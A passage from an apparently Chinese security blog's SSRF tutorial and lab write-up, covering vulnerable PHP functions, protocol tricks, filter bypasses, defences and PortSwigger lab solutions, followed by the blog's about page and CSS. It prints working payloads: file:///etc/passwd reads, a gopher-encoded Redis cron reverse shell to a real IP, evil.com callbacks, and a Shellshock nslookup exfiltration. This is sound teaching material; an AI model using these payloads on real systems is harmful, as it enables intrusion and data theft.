src=\\\"\".$filename.\"\\\"/&gt;\"; } echo $img; ?&gt; 2、fsockopen(): 以下代码使用fsockopen函数实现获取用户指定url的数据（文件或者html）。这个函数会使用socket跟服务器建立tcp连接，传输原始数据。 定义：打开一个网络连接或者一个Unix套接字连接 参数\t描述 hostname\t安装了OpenSSL，添加访问协议ssl://或者是tls://，从而可以使用基于TCP/IP协议的SSL或者TLS的客户端连接到远程主机 port\t端口号。如果对该参数传一个-1，则表示不使用端口，例如unix:// errno\t如果errno的返回值为0，而且这个函数的返回值为false，那么这表明该错误发生在套接字连接（connect()）调用之前，导致连接失败的原因最大的可能是初始化套接字的时候发生了错误 errstr\t错误信息将以字符串的信息返回。 timeout\t设置连接的时限，单位为秒。 &lt;?php function GetFile($host,$port,$link) { $fp = fsockopen($host, intval($port), $errno, $errstr, 30); if (!$fp) { echo \"$errstr (error number $errno) \"; }else { $out = \"GET $link HTTP/1.1\\r \"; $out .= \"Host: $host\\r \"; $out .= \"Connection: Close\\r \\r \"; $out .= \"\\r \"; fwrite($fp, $out); $contents=''; while (!feof($fp)) { $contents.= fgets($fp, 1024); } fclose($fp); return $contents; } } ?&gt; 3、curl_exec():支持多种协议 cURL这是另一个非常常见的实现，它通过 PHP获取数据。文件/数据被下载并存储在“curled”文件夹下的磁盘中，并附加了一个随机数和“.txt”文件扩展名。 定义：执行一个cURL会话 参数：ch 由 curl_init() 返回的 cURL 句柄。 用法：抓取URL并把它传递给浏览器 curl_exec($ch) &lt;?php if (isset($_POST['url'])) { $link = $_POST['url']; $curlobj = curl_init(); curl_setopt($curlobj, CURLOPT_POST, 0); curl_setopt($curlobj,CURLOPT_URL,$link); curl_setopt($curlobj, CURLOPT_RETURNTRANSFER, 1); $result=curl_exec($curlobj); curl_close($curlobj); $filename = './curled/'.rand().'.txt'; file_put_contents($filename, $result); echo $result; } ?&gt; 注意事项 一般情况下PHP不会开启fopen的gopher wrapper file_get_contents的gopher协议不能URL编码 file_get_contents关于Gopher的302跳转会出现bug，导致利用失败 curl/libcurl 7.43 上gopher协议存在bug(%00截断) 经测试7.49 可用 curl_exec() 默认不跟踪跳转， file_get_contents()支持php://input协议 五、SSRF中URL的伪协议 redis服务是在6379端口开启的 浅浅了解一下redis服务 浅浅了解一下curl命令 curl 是常用的命令行工具，用来请求 Web 服务器。它的名字就是客户端（client）的 URL 工具的意思 不带有任何参数时，curl 就是发出 GET 请求 $ curl https://www.example.com 上面命令向www.example.com发出 GET 请求，服务器返回的内容会在命令行输出 -v参数输出通信的整个过程，用于调试。我们便可以利用-v参数进行读取文件 使用file协议curl -v file:///etc/passwd 使用ftp协议 curl -v \"ftp://127.0.0.1:端口/info\" 使用dict协议 curl -v \"dict://127.0.0.1:端口/info\" 使用gopher协议 curl -v \"gopher://127.0.0.1:端口/_info\" 其他参数可以参考curl 常见内网IP段 局域网地址范围分三类，以下IP段为内网IP段： C类：192.168.0.0 - 192.168.255.255 B类：172.16.0.0 - 172.31.255.255 A类：10.0.0.0 - 10.255.255.255 当我们发现SSRF漏洞后，首先要做的事情就是测试所有可用的URL伪协议 file:/// 从文件系统中获取文件内容，如，file:///etc/passwd dict:// 字典服务器协议，访问字典资源，如，dict:///ip:6739/info： sftp:// SSH文件传输协议或安全文件传输协议 ldap:// 轻量级目录访问协议 tftp:// 简单文件传输协议 gopher:// 分布式文档传递服务，可使用gopherus生成payload 5.1 file 这种URL Schema可以尝试从文件系统中获取文件： http://example.com/ssrf.php?url=file:///etc/passwd http://example.com/ssrf.php?url=file:///C:/Windows/win.ini 如果该服务器阻止对外部站点发送HTTP请求，或启用了白名单防护机制，只需使用如下所示的URL Schema就可以绕过这些限制： 5.2 dict 这种URL Scheme能够引用允许通过DICT协议使用的定义或单词列表。 DICT协议,一个字典服务器协议,A Dictionary Server Protocol，允许客户端在使用过程中访问更多字典并且该协议约定服务器端侦听端口号:2628。 http://example.com/ssrf.php?dict://evil.com:1337/ evil.com:$ nc -lvp 1337 Connection from [192.168.0.12] port 1337[tcp/*] accepted (family 2, sport 31126)CLIENT libcurl 7.40.0 5.3 sftp 在这里，Sftp代表SSH文件传输协议（SSH File Transfer Protocol），或安全文件传输协议（Secure File Transfer Protocol），这是一种与SSH打包在一起的单独协议，它运行在安全连接上，并以类似的方式进行工作。 http://example.com/ssrf.php?url=sftp://evil.com:1337/ evil.com:$ nc -lvp 1337 Connection from [192.168.0.12] port 1337[tcp/*] accepted (family 2, sport 37146)SSH-2.0-libssh2_1.4.2 5.4 ldap://或ldaps:// 或ldapi:// LDAP代表轻量级目录访问协议。它是IP网络上的一种用于管理和访问分布式目录信息服务的应用程序协议。 http://example.com/ssrf.php?url=ldap://localhost:1337/%0astats%0aquithttp://example.com/ssrf.php?url=ldaps://localhost:1337/%0astats%0aquithttp://example.com/ssrf.php?url=ldapi://localhost:1337/%0astats%0aquit 5.5 tftp:// TFTP（Trivial File Transfer Protocol,简单文件传输协议）是一种简单的基于lockstep机制的文件传输协议，它允许客户端从远程主机获取文件或将文件上传至远程主机。 http://example.com/ssrf.php?url=tftp://evil.com:1337/TESTUDPPACKET evil.com:# nc -lvup 1337 Listening on [0.0.0.0] (family 0, port1337)TESTUDPPACKEToctettsize0blksize512timeout3 5.6 gopher:// Gopher是一种分布式文档传递服务。利用该服务，用户可以无缝地浏览、搜索和检索驻留在不同位置的信息。 Gopher 协议可以做很多事情，特别是在 SSRF 中可以发挥很多重要的作用。利用此协议可以攻击内网的 FTP、Telnet、Redis、Memcache，也可以进行 GET、POST 请求。 http://example.com/ssrf.php?url=http://attacker.com/gopher.php gopher.php (host it on acttacker.com):-&lt;?php header('Location: gopher://evil.com:1337/_Hi%0Assrf%0Atest');?&gt; evil.com:# nc -lvp 1337 Listening on [0.0.0.0] (family 0, port1337)Connection from [192.168.0.12] port 1337[tcp/*] accepted (family 2, sport 49398)Hissrftest 六、SSRF漏洞利用（危害） 1.可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的banner信息; 2.攻击运行在内网或本地的应用程序（比如溢出）; 3.对内网web应用进行指纹识别，通过访问默认文件实现; 4.攻击内外网的web应用，主要是使用get参数就可以实现的攻击（比如struts2，sqli等）; 5.利用file协议读取本地文件等。. 6.各个协议调用探针：http,file,dict,ftp,gopher等 http:192.168.64.144/phpmyadmin/ file:///D:/www.txt dict://192.168.64.144:3306/info ftp://192.168.64.144:21 七、漏洞的验证： 根据漏洞产生的原理，对所我们所测试的地方进行一个分析 首先这个地方应该是服务器A请求访问以外的服务端B，而不是客户端向服务器A发起请求 使用排除法：看URL地址中有没有包含其他URL地址，再看数据包的请求 方法一：对URL地址进行分析 我在网上随便找了一张图片，右键新标签打开后 对URL地址进行了解码，就看见了2个包含的URL地址 方法二：对数据包进行分析 其实也可以使用burpsuite抓包进行分析 这里直接看见了文件的URL是其他网站来的 八、利用步骤 第一步：分析是否可能存在SSRF （一般要测试3个函数curl_exec、file_get_content、fsockopen是否能执行成功） 第二步：测试是哪种函数引起的SSRF漏洞 对端口进行一个探测（http协议），能够探测到内容，说明存在SSRF漏洞，并且进一步尝试其他操作 内网应用指纹识别（http协议） 读取文件（file协议） 具体参考：https://blog.csdn.net/qq_53079406/article/details/124005258?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522168112506716800215018171%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=168112506716800215018171&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-4-124005258-null-null.142 九、绕过方式 部分存在漏洞，或者可能产生SSRF的功能中做了白名单或者黑名单的处理，来达到阻止对内网服务和资源的攻击和访问。因此想要达到SSRF的攻击，需要对请求的参数地址做相关的绕过处理，常见的绕过方式如下： 一、常见的绕过方式 1、限制为http://www.xxx.com 域名时（利用@与/#/） 可以尝试采用http基本身份认证的方式绕过 如：http://www.aaa.com@www.bbb.com@www.ccc.com，在对@解析域名中，不同的处理函数存在处理差异 在PHP的parse_url中会识别www.ccc.com，而libcurl则识别为www.bbb.com。 /#/符:绕过后缀 一般用于.jpg等固定后缀不可更改 例如http://10.10.10.10:5001/#/abc.jpg，实际在浏览器访问的是 http://10.10.10.10:5001 2.采用短网址绕过 比如百度短地址https://dwz.cn/ 3.采用进制转换 127.0.0.1八进制：0177.0.0.1。十六进制：0x7f.0.0.1。十进制：2130706433. IP地址转为八、十、十六进制及IP地址省略写法（以下均代表127.0.0.1） 0177.00.00.01 2130706433 0x7f.0x0.0x0.0x1 127.1 4.利用特殊域名 原理是DNS解析。xip.io可以指向任意域名，即 127.0.0.1.xip.io，可解析为127.0.0.1 (xip.io 现在好像用不了了，可以找找其他的) http://www.owasp.org.127.0.0.1.xip.io/ 5.利用[::]绕过localhost 可以利用[::]来绕过localhost http://169.254.169.254&gt;&gt;http://[::169.254.169.254] http://[::1] http://[::]:80/ http://0:80 6.利用句号 127。0。0。1 &gt;&gt;&gt; 127.0.0.1 7.CRLF 编码绕过 %0d-&gt;0x0d-&gt;\\r回车 %0a-&gt;0x0a-&gt; 换行 进行HTTP头部注入 example.com/?url=http://eval.com%0d%0aHOST:fuzz.com%0d%0a 8.利用封闭的字母数字 利用Enclosed alphanumerics ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ &gt;&gt;&gt; example.com http://169.254.169.254&gt;&gt;&gt;http://[::①⑥⑨｡②⑤④｡⑯⑨｡②⑤④] List: ① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ ⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ ⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ ⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ ⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ ⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿ 9.配置域名 手上有可控域名，可将域名指向想要请求的IP 10.库绕过 利用检测时使用的URL parse库与请求时使用的parse库的差异绕过，如 http://1.1.1.1 &amp;@2.2.2.2# @3.3.3.3/ 不同的parse库的解析结果不一样 urllib2 : 1.1.1.1 requests + browsers : 2.2.2.2 urllib : 3.3.3.3 11.dns重定向绕过 一般进行 ssrf 防御的模式如下： 1. 获取到输入的URL，从该URL中提取host 对该host进行DNS解析，获取到解析的IP 2. 访问规则判断该IP是否在指定范围内（即判断IP是否符合规则） 如果IP在范围内，即对此URL发起请求 如果IP不在范围内，则请求失败 然而访问规则在判段得到的IP为指定范围内IP，到服务端请求URL这个中间还存在一个细微的时间差， DNS重绑定则是利用这一点，让服务器第一次解析host的ip为符合规则的公网IP，在第二次请求解析URL时host的ip又变为了不符合规则的内网IP，从而进行ssrf。 这里推荐使用burpsuite的intruder模块，来批量发送请求，以利用时间差完成ssrf。 在线DNS重绑定平台：https://lock.cmpxchg8b.com/rebinder.html 12.攻击本地 http://127.0.0.1:80 http://localhost:22 13.利用上传 也不一定是上传，我也说不清，自己体会 -.- 修改\"type=file\"为\"type=url\" 比如： 上传图片处修改上传，将图片文件修改为URL，即可能触发SSRF 14.利用协议 Dict:// dict://&lt;user-auth&gt;@&lt;host&gt;:&lt;port&gt;/d:&lt;word&gt; ssrf.php?url=dict://attacker:11111/ SFTP:// ssrf.php?url=sftp://example.com:11111/ TFTP:// ssrf.php?url=tftp://example.com:12346/TESTUDPPACKET LDAP:// ssrf.php?url=ldap://localhost:11211/%0astats%0aquit Gopher:// ssrf.php?url=gopher://127.0.0.1:25/xHELO%20localhost%250d%250aMAIL%20FROM%3A%3Chacker@site.com%3E%250d%250aRCPT%20TO%3A%3Cvictim@site.com%3E%250d%250aDATA%250d%250aFrom%3A%20%5BHacker%5D%20%3Chacker@site.com%3E%250d%250aTo%3A%20%3Cvictime@site.com%3E%250d%250aDate%3A%20Tue%2C%2015%20Sep%202017%2017%3A20%3A26%20-0400%250d%250aSubject%3A%20AH%20AH%20AH%250d%250a%250d%250aYou%20didn%27t%20say%20the%20magic%20word%20%21%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250a 15.302重定向 需要一个vps，把302转换的代码部署到vps上，然后去访问，就可跳转到内网中 服务端代码如下： &lt;?php header(\"Location: http://192.168.1.10\"); exit(); ?&gt; 16.使用组合 各种绕过进行自由组合即可 十、SSRF漏防御 通常有以下5个思路： 1.过滤返回信息，验证远程服务器对请求的响应是比较容易的方法。如果web应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。 2.统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。 3.限制请求的端口为http常用的端口，比如，80,443,8080,8090。 4.黑名单内网，避免应用被用来获取获取内网数据，攻击内网。 5.禁用不需要的协议。仅仅允许http和https请求。可以防止类似于file:///,gopher://,ftp:// 等引起的问题。 6.去除url中的特殊字符 7.不跟随30x跳转（跟随跳转需要从1开始重新检测） 8.请求时设置host header为ip 十一、靶场实战 1. SSRF-curl 第一步：分析是否可能存在SSRF （一般要测试3个函数curl_exec、file_get_content、fsockopen是否能执行成功） 点击它 发现是URL传递的 （如果无法显示，就在127.0.0.1后面加上端口号） 第二步：测试是哪种函数引起的SSRF漏洞 这是个SSRF（curl）靶场，就不做过多测试 函数不同所支持的功能也存在差别 对端口进行一个探测（http协议）(当然实战过程中肯定要对端口进行爆破，响应时间长的端口就是可以访问的端口) http://localhost:8080/pikachu-master/vul/ssrf/ssrf_curl.php?url=http://127.0.0.1:3306 能够探测到内容，说明存在SSRF漏洞，并且进一步尝试其他操作 内网应用指纹识别（http协议） （这个我在尝试的时候，如果原文件带了版本号，读取的时候也要带，大小写不一样不影响） 读取文件（file协议） 2. SSRF-file_get_contents 第一步：判断是否存在SSRF漏洞 上一题是url，这一题是file函数 但是操作还是基本类似 8.2.2、第二步：利用漏洞 读取php源码 http://localhost:8080/pikachu-master/vul/ssrf/ssrf_fgc.php?file=php://filter/read=convert.base64-encode/resource=ssrf.php 再使用base64解密即可得到源码 &lt;?php /** * Created by runner.han * There is nothing new under the sun */ $SELF_PAGE = substr($_SERVER['PHP_SELF'],strrpos($_SERVER['PHP_SELF'],'/')+1); if ($SELF_PAGE = \"ssrf.php\"){ $ACTIVE = array('','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','active open','active','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','',''); } $PIKA_ROOT_DIR = \"../../\"; include_once $PIKA_ROOT_DIR.'header.php'; ?&gt; &lt;div class=\"main-content\"&gt; &lt;div class=\"main-content-inner\"&gt; &lt;div class=\"breadcrumbs ace-save-state\" id=\"breadcrumbs\"&gt; &lt;ul class=\"breadcrumb\"&gt; &lt;li&gt; &lt;i class=\"ace-icon fa fa-home home-icon\"&gt;&lt;/i&gt; &lt;a href=\"ssrf.php\"&gt;&lt;/a&gt; &lt;/li&gt; &lt;li class=\"active\"&gt;概述&lt;/li&gt; &lt;/ul&gt; &lt;/div&gt; &lt;div class=\"page-content\"&gt; &lt;b&gt;SSRF(Server-Side Request Forgery:服务器端请求伪造)&lt;/b&gt; &lt;p&gt;其形成的原因大都是由于服务端&lt;b&gt;提供了从其他服务器应用获取数据的功能&lt;/b&gt;,但又没有对目标地址做严格过滤与限制&lt;/p&gt; 导致攻击者可以传入任意的地址来让后端服务器对其发起请求,并返回对该目标地址请求的数据&lt;br&gt; &lt;br&gt; 数据流:攻击者-----&gt;服务器----&gt;目标地址&lt;br&gt; &lt;br&gt; 根据后台使用的函数的不同,对应的影响和利用方法又有不一样 &lt;pre style=\"width: 500px;\"&gt; PHP中下面函数的使用不当会导致SSRF: file_get_contents() fsockopen() curl_exec() &lt;/pre&gt;&lt;br&gt; 如果一定要通过后台服务器远程去对用户指定(\"或者预埋在前端的请求\")的地址进行资源请求,&lt;b&gt;则请做好目标地址的过滤&lt;/b&gt;。 &lt;br&gt; &lt;br&gt; 你可以根据\"SSRF\"里面的项目来搞懂问题的原因 &lt;/div&gt;&lt;!-- /.page-content --&gt; &lt;/div&gt; &lt;/div&gt;&lt;!-- /.main-content --&gt; &lt;?php include_once $PIKA_ROOT_DIR . 'footer.php'; ?&gt; 读取本地host等文件 http://localhost:8080/pikachu-master/vul/ssrf/ssrf_fgc.php?file=file://c:\\windows\\system32\\drivers\\etc\\hosts 3. SSRF-lab实战 可利用的主要就几个协议吧 file 协议结合目录遍历读取文件。 gopher 协议打开端口。 dict 协议主要用于结合 curl 攻击。 http 协议进行内网探测。 SSRF-Lab 搭建教程：https://drun1baby.top/2022/05/16/SSRF-Lab环境搭建/ 3.1 file协议利用 使用 file 协议进行的任意文件读取算是 ssrf 最简单的利用方式了 首先先写一段有 ssrf 漏洞的代码，命名为 ssrf.php 并部署到服务器上。 用 file 协议简单测试一下，可以看到能成功利用 ssrf 漏洞读取文件。file 协议的格式为：file:// 文件路径 这里不知道为什么我的服务器读取不到内网文件，先借用佬的图片了 Payload file:///etc/passwd # file:// 之后可以接任意文件 这里的 Payload 只是一个基础示范，还可以读取很多文件，在实战渗透当中，更多情况应该是通过 GET 请求攻击的。 http://ip/index.php?url=file:///etc/passwd 而在 SSRF-Lab 当中较简单，在框中输入file:///etc/passwd即可。 除此之外，利用这个协议可以读取主机内任意文件。接下来可以读取配置文件和源代码方便进一步的渗透，这里之所以成功实现是因为URL没有经过严格的过滤，所以才可以利用这个协议进行任意文件读取。 3.2 http协议研究 http 协议的利用也很简单，就是向目标发送 http 请求，由于 get 请求的参数是直接加在 url 里的，所以可以探测内网那些使用 get 请求即可攻击的应用。 使用 nc 可以接收到发送的 http 数据包，结构非常简单。 3.3 dict 协议的使用 利用dict协议，dict://ip/info可获取本地redis服务配置信息。 如果在靶场当中要尝试 dict 协议读取 Redis 需要先安装一下 redis-server，具体可见 redis 与 dict 协议 在上面还介绍过redis服务，看了很多SSRF 协议中的利用都是结合 Redis 服务的，所以这里就先在ssrf-basics 容器里面安装该服务 $ docker ps #查看容器编号 $ docker exec -it 容器编号 /bin/bash #进入容器 $ apt-get install redis-server # 安装redis服务 $ redis-server #开启redis服务 安装好之后，便可以利用协议收集信息及反弹 shell 利用dict协议，dict://127.0.0.1:6379/info可获取本地redis服务配置信息 这里大概是因为6379是其默认端口 用 nc 在测试机监听，然后利用 ssrf 漏洞测试一下 dict 协议发送字符串 info，看看接收方会收到什么： 可以看到一共收到了三行数据，第一行是版本号，第二行是我们发送的数据，第三行是自动添加的 QUIT。 dict 协议不支持换行符，没有办法进行换行，相当于一次只能执行一条命令，所以不能用来攻击那些需要交互的应用（比如需要认证的 redis）。 3.4 gopher 协议的使用 首先先了解一下通常攻击 Redis 的命令，然后转化为 Gopher 可用的协议 redis-cli -h $1 flushall echo -e \" */1 * * * * bash -i &gt;&amp; /dev/tcp/127.0.0.1/45952 0&gt;&amp;1 \"|redis-cli -h $1 -x set 1 redis-cli -h $1 config set dir /var/spool/cron/ redis-cli -h $1 config set dbfilename root redis-cli -h $1 save //redis-cli查看所有的keys及清空所有的数据 这便是常见的exp，只需自己更改IP和端口即可，改成适配于Gopher协议的 URL： gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/185.243.241.45/5555 0&gt;&amp;1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a 经过url解码便是： gopher://127.0.0.1:6379/_*1 $8 flushall *3 $3 set $1 1 $64 */1 * * * * bash -i &gt;&amp; /dev/tcp/185.243.241.45/5555 0&gt;&amp;1 *4 $6 config $3 set $3 dir $16 /var/spool/cron/ *4 $6 config $3 set $10 dbfilename $4 root *1 $4 save quit 进行测试，成功回显 接下来在 ssrf-lab/basics 容器里面查看插入的 KEY 值，验证是否成功 利用Gopher 协议还可以攻击 FastCGI，攻击内网 Vulnerability Web 高级文章：https://xz.aliyun.com/t/9554#toc-10 需要发送多行数据时，就要用到 gopher 协议，同样使用 nc 简单测试一下，可以看到接收端成功接收到了换行的数据，所以 gopher 协议可以用来攻击那些需要交互的应用。 至于这个 _ 符号暂时不知道为何要+，下面结论有解释 结论： 1、gopher 协议会吃掉第一个字符，所以要先放一个没有用的字符 2、回车是 \\r ，但如果直接对 \\r 进行 url 编码结果是不对的，因为编码的是 \\ r \\ n 四个字符的结果，实际回车只是两个不可见的字符，url 编码为 %0d%0a 3、直接发 % 可以正常接收，但是发 %0d%0a 就会出现数据包发不出去的问题，还需要进行一次 url 编码成 %250d%250a 才能正常发送出去（直接用 curl 命令测试没这个问题，应该是 web 服务器会自动进行一次 url 解码导致的） 3.5 Weblogic SSRF漏洞 参考：https://xz.aliyun.com/t/7333#toc-5 3.6 更多攻击对象 参考：https://blog.chaitin.cn/gopher-attack-surfaces/ 十二、Portswigger-Lab 针对本地服务器的基本 SSRF 现在先明晰实验任务 我们访问实验室之后，bp开启接着随便点击页面的功能，之后我们到http历史看看有何亮点 可以发现这里的/product/stock中的stockApi参数很可疑，后面跟的是url地址，根据题目刚开始的提示，这里肯定存在ssrf了 我们尝试访问http://localhost/admin 发现我们成功访问到admin的页面，但当我们想直接访问admin却是没有权限的 接下来删掉目标用户即可，但当我放包成功进入admin页面时，发现没有权利删除，这意味着我们只是靠着ssrf仅仅能访问而已。那我们依旧要利用ssrf删除目标用户。 我们注意到上面图中的url地址，我们只需要将stockApi赋值为：http://localhost/admin/delete?username=carlos 即可 成功通关 针对另一个后端系统的基本 SSRF 根据任务提示，这里需要利用ssrf进行内网探测扫描，我们直接开始 如下图，设置好爆破模块直接开始 成功探测到内网管理员服务器，接着我们类似上一个实验直接删除目标用户即可 带外检测的盲SSRF 看任务似乎就是简单的ssrf无回显问题，我们先访问靶机 这里我们根据任务提示，在点击商品加载功能的时候就抓包 如下图我们修改referer头为我们bp自带的collaborator给的服务器地址即可，如下图成功解决 带有基于黑名单的输入滤波器的 SSRF 任务相同，只不过有了防御，我们抓包看看，如下图，当我们尝试简单而又直接的访问会发现被过滤了 这里测试了一下发现过滤的时localhost与admin关键词，前面的本地回环地址很容易绕过，我这里采用的缩写绕过 127.1，至于这个admin刚开始想不到，看了wp发现是要进行二次url编码即可绕过。 至于为何是二次url编码，是因为这里在到达内网服务器之前经过http的请求会先进行一次url解码，到达 内网服务器的时候又会进行一次解码，如果我们值编码一次，在到达之前admin就是原型了，依旧会被过滤掉 %2561%2564%256d%2569%256e payload：http://127.1/%2561%2564%256d%2569%256e/delete?username=carlos SSRF 通过开放重定向绕过过滤器漏洞 这里没想通该如何做只能看提示了，这里根据提示说明参数stockApi只能访问本地应用，说明应该去寻找其他有重定向功能的参数 如下图点击抓包 当我们发包会发现有一个重定向功能，那我们就能利用重定向去访问管理员服务器了 成功删除 具有 Shellshock 利用的盲 SSRF 这里没遇到过，就跟着提示走了 在 Burp Suite Professional 中，从 BApp 商店安装“Collaborator Everywhere”扩展程序。 将实验室的域添加到 Burp Suite 的目标范围，以便 Collaborator Everywhere 将它作为目标。 接着浏览网站。 请注意，当您加载产品页面时，它会通过 Referer 标头触发与 Burp Collaborator 的 HTTP 交互。 请注意，HTTP 交互在 HTTP 请求中包含 User-Agent 字符串。 将请求发送到产品页面以发送 Burp Intruder。 转到 Collaborator 选项卡并生成唯一的 Burp Collaborator 有效负载。将其放入以下 Shellshock 有效负载中： () { :; }; /usr/bin/nslookup $(whoami).sc8jhzowoa6hh3l54qtioxggh7nybrzg.oastify.com 将 Burp Intruder 请求中的 User-Agent 字符串替换为包含 Collaborator 域的 Shellshock 有效负载。 更改 Referer 标头， http://192.168.0.1:8080 然后突出显示 IP 地址的最后一个八位字节（数字 1 ），单击“添加 §”。 如上图我们设置好后，即可开始攻击，如下图所示，最终我们可以查看到DNS请求，其中DNS的子域即为目标系统的用户名 基于白名单的输入滤波器的 SSRF 任务依旧老样子，不过根据题目我们可以知道这次由黑名单防御换成了白名单，老样子我们bp抓包 在几次尝试之后，这里说只能允许域名host为stock.weliketoshop.net，这里我当时想到了@等符号来绕过，但终究不知其原理，这里跟着提示走了 这里需要对url解析器的各个符号以及每个字段的作用有一定的了解，简单展示一下 &lt;scheme&gt;://&lt;user&gt;:&lt;password&gt;@&lt;host&gt;:&lt;port&gt;/&lt;path&gt;;&lt;params&gt;?&lt;query&gt;#&lt;frag&gt; scheme: 协议，常见的有 http（80），https（443），mailto，ftp（21），rtsp，rtspu，file。 user：用户名。 password： 密码。 host：主机。 port： 端口。 params: 参数。通常为 key=value。 query：查询参数或查询字符串。 frag: 片段（在浏览器中会被解析为 window.location.hash）。 因此我们做如下实验，发现页面回显500，说明我们成功绕过了 但我们目的是想要ssrf，因此我们就想着将username改为localhost，这里在经过该web页面的响应，他会认为后面的stock才是真正的host。 但我们像访问的是内网中的管理员服务器，这时候我们需要添加#符号，这样该符号后面的都会被认为其前面url地址的片段。即：http://locahost#@stock.weliketoshop.net 但这里发现被过滤了，根本原因是在我们请求到内部服务器之前，会首先去请求当前web页面，但此时他会认为#符号前面的域名才是真正的域名，但该域名不是白名单指定的，因此凭借此思路，我们会想到对#进行url编码，由于这里利用的是ssrf，一共做出了两次请求，所以我们需要url编码两次 http://locahost%2523@stock.weliketoshop.net/admin/delete?username=carlos 成功解决，下面是一些针对url解析器的小知识 一些应用程序只允许匹配以允许值的白名单开头或包含这些值的输入。在这种情况下，有时可以通过利用URL解析中的不一致性来绕过过滤。 URL 规范包含了许多在实现 URL 特定解析和验证时容易被忽略的特性: （1） 您可以使用@字符在主机名之前的URL中嵌入凭据。例如： https://expected-host@evil-host https://evil-host#expected-host （3） 您可以利用DNS命名层次结构将所需的输入放入您控制的标准DNS名称中。例如： https://expected-host.evil-host （4） 您可以通过url编码字符来混淆url解析代码。如果实现过滤器的代码处理url编码字符的方式与处理后端HTTP请求的代码不同，那么这一点特别有用 十三、参考文章 通过Portwigge的Web安全漏洞训练平台，学习SSRF PortSwigger SSRF Labs 解析url中的#、&amp;、？的作用和意义 浅谈HTTP之URL","categories":["常见top漏洞"]},{"title":"关于","path":"/about/index.html","content":"简单的介绍 本人在2023.7.25搭起博客了，接下来将会在这里发布文章 hybcx，目前是大二在校生（仍然为菜鸡一枚~） 中北大学，，Web手（渴望成为佬），入门时间的话是2022.11.3号，希望师傅们带带~ 喜欢玩的游戏：CF、CSGO 本人也是上了大学偶然接触到CTF，才开始慢慢了解网络安全，也是在这个过程中深深地被其吸引（内心当中觉得网络安全是无敌的！！！），很后悔没有早点了解到网络安全，当然一切也不迟。 在这一路上遇到很多大佬，有年龄比我大的，也有比我小的（甚至初中吊打我0.0），常言道：“吾师道也，夫庸知其年之先后生于吾乎？是故无贵无贱，无长无少，道之所存，师之所存也。”希望我会在网络安全这条道路上一直走下去，探索网络奥秘！"},{"title":"友链","path":"/friends/index.html","content":"欢迎师傅们互换友链，一起进步！！！"},{"path":"/custom/css/ZYCode.css","content":":root{ --code-autor: '© 钟意博客🌙'; --code-tip: \"优雅借鉴\"; } /*语法高亮*/ .hljs { position: relative; display: block; overflow-x: hidden; /*背景跟随Stellar*/ background: var(--block); color: #9c67a1; padding: 30px 5px 2px 5px; box-shadow: 0 10px 30px 0px rgb(0 0 0 / 40%) } .hljs::before { content: var(--code-tip); position: absolute; left: 15px; top: 10px; overflow: visible; width: 12px; height: 12px; border-radius: 16px; box-shadow: 20px 0 #a9a6a1, 40px 0 #999; -webkit-box-shadow: 20px 0 #999, 40px 0 #999; background-color: #999; white-space: nowrap; text-indent: 75px; font-size: 16px; line-height: 12px; font-weight: 700; color: #999 } .highlight:hover .hljs::before { color: #35cd4b; box-shadow: 20px 0 #fdbc40, 40px 0 #35cd4b; -webkit-box-shadow: 20px 0 #fdbc40, 40px 0 #35cd4b; background-color: #fc625d; } .hljs-ln { display: inline-block; overflow-x: auto; padding-bottom: 5px } .hljs-ln td { padding: 0; background-color: var(--block) } .hljs-ln::-webkit-scrollbar { height: 10px; border-radius: 5px; background: #333; } .hljs-ln::-webkit-scrollbar-thumb { background-color: #bbb; border-radius: 5px; } 